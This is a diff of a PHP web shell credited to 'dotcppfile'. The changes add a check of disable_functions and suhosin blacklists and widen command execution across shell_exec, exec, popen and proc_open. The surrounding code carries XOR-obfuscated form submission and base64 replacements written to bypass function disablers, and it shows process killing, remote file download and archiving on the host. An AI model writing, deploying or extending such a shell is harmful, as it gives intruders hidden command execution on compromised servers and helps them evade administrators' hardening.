@@ -79,6 +79,26 @@ if (!isset($_SESSION['key']))
 }
 #<--
 
+#Checks if a function is/isn't disabled
+$disbls = @ini_get('disable_functions').','.@ini_get('suhosin.executor.func.blacklist');
+$disblsArray = explode(",", $disbls);
+
+function checkIt($func)
+{
+	global $disblsArray;
+	
+	foreach ($disblsArray as $value)
+	{
+		if ($func == $value)
+		{
+			return False;
+		}
+	}
+
+	return True;
+}
+#<--
+
 #`base64_encode`, `base64_decode`, `bindec` and `decbin` Replacements to bypass Disablers-->
 $base64ids = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/");
 
@@ -390,22 +410,22 @@ function soft_exists($command)
 
 	$complete = "$whereIsCommand $command";
 
-	if($shell_exec == true)
+	if($shell_exec == True)
 	{
 		return shell_exec($complete);
 	}
-	else if($exec == true)
+	else if($exec == True)
 	{
 		return exec($complete);
 	}
-	else if($popen == true)
+	else if($popen == True)
 	{
 		$pid = popen($complete,"r");
 		$result = fread($pid, 2096);
 		pclose($pid);
 		return $result;
 	}
-	else if($proc_open == true)
+	else if($proc_open == True)
 	{
 		$process = proc_open(
 			$complete,
@@ -518,8 +538,6 @@ function evalRel($command)
 #Zips Windows Dir-->
 function zipWindows($zip_location, $folder)
 {
-	global $shell_exec, $exec, $popen, $proc_open, $system, $passthru;
-
 	$code = 'ArchiveFolder "' . $zip_location . '", "' . $folder . '"
 
 Sub ArchiveFolder (zipFile, sFolder)
@@ -753,7 +771,7 @@ function xorencr(form, command)
 
 	form.command.value = xor_str(command.value);
 	form.submit();
-	return true;
+	return True;
 }
 
 function xorencr2(form, language, command) 
@@ -766,7 +784,7 @@ function xorencr2(form, language, command)
 
 	form.eval.value = xor_str(command.value);
 	form.submit();
-	return true;
+	return True;
 }
 
 function xorencr3(form, original_name, new_name) 
@@ -780,7 +798,7 @@ function xorencr3(form, original_name, new_name)
 	form.original_name.value = btoa(original_name.value);	
 	form.new_name.value = xor_str(new_name.value);	
 	form.submit();
-	return true;
+	return True;
 }
 
 function xorencr4(form, dir) 
@@ -793,7 +811,7 @@ function xorencr4(form, dir)
 
 	form.dir.value = xor_str(dir.value);	
 	form.submit();
-	return true;
+	return True;
 }
 
 function xorencr5(form, content) 
@@ -806,7 +824,7 @@ function xorencr5(form, content)
 
 	form.content.value = xor_str(content.value);	
 	form.submit();
-	return true;
+	return True;
 }
 
 function showDiv()
@@ -921,7 +939,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		echo "
 		<tr>
 			<td>$function</td>";
-		if(function_exists($function))
+		if(checkIt($function))
 		{
 			${"{$function}"} = True;
 			echo "
@@ -971,7 +989,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 	<?php
 	
 	#Gets Info -->
-	if(function_exists("php_uname"))
+	if(checkIt("php_uname"))
 	{
 		echo "
 		<tr>
@@ -994,7 +1012,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		<td>".$_SERVER['SERVER_ADDR']."</td>
 	</tr>";
 
-	if(function_exists("get_current_user"))
+	if(checkIt("get_current_user"))
 	{
 		echo "
 		<tr>
@@ -1111,7 +1129,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 				echo "N/A";
 			}		
 		}
-		else if($popen == true)
+		else if($popen == True)
 		{
 			$pid = popen('typeperf -sc 1 "\processor(_total)\% processor time"',"r");
 			$data = fread($pid, 2096);
@@ -1138,7 +1156,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 				echo "N/A";
 			}			
 		}
-		else if($proc_open == true)
+		else if($proc_open == True)
 		{
 			$process = proc_open(
 				'typeperf -sc 1 "\processor(_total)\% processor time"',	
@@ -1205,17 +1223,17 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		}
 		else if($exec == True)
 		{
-			$data = shell_exec("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'");
+			$data = exec("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'");
 			echo "<td>".round($data)."%</td>\n";
 		}
-		else if($popen == true)
+		else if($popen == True)
 		{
 			$pid = popen("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'","r");
 			$data = fread($pid, 2096);
 			pclose($pid);
 			echo "<td>".round($data)."%</td>\n";
 		}
-		else if($proc_open == true)
+		else if($proc_open == True)
 		{
 			$process = proc_open(
 				"grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'",	
@@ -1284,7 +1302,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 			$total_ram = $total_ram /1024;
 			echo "<td>" . round($total_ram) . " GB</td>\n";
 		}
-		else if($popen == true)
+		else if($popen == True)
 		{
 			$pid = popen("free -mt | grep Mem |awk '{print $2}'","r");
 			$total_ram = fread($pid, 2096);
@@ -1292,7 +1310,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 			$total_ram = $total_ram /1024;
 			echo "<td>" . round($total_ram) . " GB</td>\n";
 		}
-		else if($proc_open == true)
+		else if($proc_open == True)
 		{
 			$process = proc_open(
 				"free -mt | grep Mem |awk '{print $2}'",	
@@ -1341,8 +1359,16 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		<td>Free RAM</td>";
 	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
 	{
-		$free_ram = (int)str_replace("FreePhysicalMemory=", "", shell_exec("wmic OS get FreePhysicalMemory /Value")) /1024 /1024;
-		echo "<td>" . round($free_ram, 2) . "GB </td>";
+		if ($shell_exec == True)
+		{
+			$free_ram = (int)str_replace("FreePhysicalMemory=", "", shell_exec("wmic OS get FreePhysicalMemory /Value")) /1024 /1024;
+			echo "<td>" . round($free_ram, 2) . "GB </td>";
+		}
+		else if ($exec == True)
+		{
+			$free_ram = (int)str_replace("FreePhysicalMemory=", "", exec("wmic OS get FreePhysicalMemory /Value")) /1024 /1024;
+			echo "<td>" . round($free_ram, 2) . "GB </td>";
+		}
 	}
 	else
 	{
@@ -1356,14 +1382,14 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 			$free_ram = exec("free | grep Mem | awk '{print $3/$2 * 100.0}'");
 			echo "<td>" . round($free_ram) . "% </td>\n";
 		}
-		else if($popen == true)
+		else if($popen == True)
 		{
 			$pid = popen("free | grep Mem | awk '{print $3/$2 * 100.0}'","r");
 			$free_ram = fread($pid, 2096);
 			pclose($pid);
 			echo "<td>" . round($free_ram) . "% </td>\n";
 		}
-		else if($proc_open == true)
+		else if($proc_open == True)
 		{
 			$process = proc_open(
 				"free | grep Mem | awk '{print $3/$2 * 100.0}'",	
@@ -1497,7 +1523,7 @@ else if(isset($_POST["linkToDownload"]))
 					curl_setopt($ch, CURLOPT_TIMEOUT, 60);
 
 					curl_setopt($ch, CURLOPT_FILE, $fp);
-					curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+					curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);
 
 					$data = curl_exec($ch);
 
@@ -1642,7 +1668,7 @@ else if(isset($_GET["zip"]))
 			{
 				if(evalRel("zip -r $archiveName $archiveName")=="False")
 				{
-					echo "<p class='danger'>Can't Zip because 'exec', 'shell_exec', 'system' and 'passthru' are Disabled.</p>";
+					echo "<p class='danger'>Can't Zip because 'exec', 'shell_exec', 'system', 'passthru', `popen` and `proc_open` are Disabled.</p>";
 					$zipFail = True;
 				}
 
@@ -2117,7 +2143,7 @@ if($passthru == True)
 	echo "> ";
 }
 
-if($popen == true)
+if($popen == True)
 {
 	echo '<input type="submit" name="popen" value="Popen" '; 
 	
@@ -2129,7 +2155,7 @@ if($popen == true)
 	echo "> ";
 }
 
-if($proc_open == true)
+if($proc_open == True)
 {
 	echo '<input type="submit" name="proc_open" value="Proc_open" '; 
 	
@@ -2530,7 +2556,7 @@ if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
 			$kill = fread($pid, 2096);
 			pclose($pid);
 		}
-		else if($proc_open == true)
+		else if($proc_open == True)
 		{
 			$oprocess = proc_open(
 				"taskkill /F /PID " . $_GET["kill"] . " 2>&1",
@@ -2593,7 +2619,7 @@ if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
 		$process_list = fread($pid, 2096);
 		pclose($pid);
 	}
-	else if($proc_open == true)
+	else if($proc_open == True)
 	{
 		$oprocess = proc_open(
 			"tasklist",
@@ -2684,7 +2710,7 @@ else
 			$output = fread($pid, 2096);
 			pclose($pid);
 		}
-		else if($proc_open == true)
+		else if($proc_open == True)
 		{
 			$oprocess = proc_open(
 				"kill $pid 2>&1",
@@ -2744,10 +2770,10 @@ else
 	else if($popen == True)
 	{
 		$pid = popen("ps aux","r");
-		$process_list = fread($pid, 2096);
+		$process_list = fread($pid, 4096);
 		pclose($pid);
 	}
-	else if($proc_open == true)
+	else if($proc_open == True)
 	{
 		$oprocess = proc_open(
 			"ps aux",
